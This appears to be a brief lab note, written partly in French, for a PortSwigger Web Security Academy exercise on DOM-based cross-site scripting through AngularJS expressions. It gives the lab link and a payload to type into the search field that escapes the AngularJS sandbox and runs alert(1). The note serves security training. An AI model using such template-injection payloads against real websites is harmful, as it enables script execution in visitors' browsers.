# Lab

https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-angularjs-expression

## Payload

Dans le champ "Search" : `{{$on.constructor('alert(1)')()}}`